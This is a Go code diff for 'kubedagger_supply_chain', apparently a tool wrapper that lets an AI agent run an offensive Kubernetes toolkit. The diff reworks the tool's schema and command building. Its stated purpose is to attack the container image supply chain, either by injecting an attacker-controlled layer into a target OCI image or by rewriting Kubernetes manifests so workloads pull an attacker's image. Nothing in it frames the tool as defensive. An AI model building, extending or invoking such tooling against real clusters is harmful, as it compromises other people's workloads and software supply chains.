@@ -11,11 +11,9 @@ import (
 )
 
 type SupplyChainInput struct {
-	Action   string `json:"action"`
-	Image    string `json:"image,omitempty"`
-	Registry string `json:"registry,omitempty"`
-	Payload  string `json:"payload,omitempty"`
-	Tag      string `json:"tag,omitempty"`
+	Mode        string `json:"mode,omitempty"`
+	TargetImage string `json:"target_image,omitempty"`
+	Payload     string `json:"payload,omitempty"`
 }
 
 type SupplyChainTool struct {
@@ -29,36 +27,27 @@ func NewSupplyChain(exec executor.Executor) *SupplyChainTool {
 func (t *SupplyChainTool) Name() string { return "kubedagger_supply_chain" }
 
 func (t *SupplyChainTool) Description() string {
-	return "Manipulate OCI container images in transit or at the registry level. Intercepts image pulls via eBPF to inject layers, modify entrypoints, or replace images entirely. Can also poison local image cache."
+	return "Attack the image supply chain. Injects an attacker-controlled layer into a target OCI image, or replaces the image reference in Kubernetes manifests so workloads pull the attacker's image."
 }
 
 func (t *SupplyChainTool) InputSchema() json.RawMessage {
 	return json.RawMessage(`{
 		"type": "object",
 		"properties": {
-			"action": {
+			"mode": {
 				"type": "string",
-				"enum": ["intercept", "poison-cache", "inject-layer", "replace", "status"],
-				"description": "Supply chain attack action"
+				"enum": ["layer-inject", "manifest-replace"],
+				"description": "Attack mode (default: layer-inject)"
 			},
-			"image": {
+			"target_image": {
 				"type": "string",
 				"description": "Target image reference (e.g., nginx:latest)"
 			},
-			"registry": {
-				"type": "string",
-				"description": "Target registry to intercept"
-			},
 			"payload": {
 				"type": "string",
-				"description": "Payload to inject (path or command)"
-			},
-			"tag": {
-				"type": "string",
-				"description": "Tag to target for replacement"
+				"description": "Payload to inject (layer path or replacement image reference)"
 			}
-		},
-		"required": ["action"]
+		}
 	}`)
 }
 
@@ -68,31 +57,22 @@ func (t *SupplyChainTool) Execute(ctx context.Context, params json.RawMessage) (
 		return errorResult("invalid input: " + err.Error()), nil
 	}
 
-	if err := validateSafeString(input.Image, "image"); err != nil {
-		return errorResult(err.Error()), nil
-	}
-	if err := validateSafeString(input.Registry, "registry"); err != nil {
+	if err := validateSafeString(input.TargetImage, "target_image"); err != nil {
 		return errorResult(err.Error()), nil
 	}
 	if err := validateSafeString(input.Payload, "payload"); err != nil {
 		return errorResult(err.Error()), nil
 	}
-	if err := validateSafeString(input.Tag, "tag"); err != nil {
-		return errorResult(err.Error()), nil
-	}
 
-	args := []string{"supply-chain", "--action", input.Action}
-	if input.Image != "" {
-		args = append(args, "--image", input.Image)
+	args := []string{"supply-chain"}
+	if input.Mode != "" {
+		args = append(args, "--mode", input.Mode)
 	}
-	if input.Registry != "" {
-		args = append(args, "--registry", input.Registry)
+	if input.TargetImage != "" {
+		args = append(args, "--target-image", input.TargetImage)
 	}
 	if input.Payload != "" {
 		args = append(args, "--payload", input.Payload)
-	}
-	if input.Tag != "" {
-		args = append(args, "--tag", input.Tag)
 	}
 
 	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
@@ -106,7 +86,7 @@ func (t *SupplyChainTool) Execute(ctx context.Context, params json.RawMessage) (
 
 	output := strings.TrimSpace(string(result.Stdout))
 	var sb strings.Builder
-	fmt.Fprintf(&sb, "## KubeDagger Supply Chain: %s\n\n", input.Action)
+	sb.WriteString("## KubeDagger Supply Chain\n\n")
 	if output == "" {
 		sb.WriteString("Operation completed.\n")
 	} else {
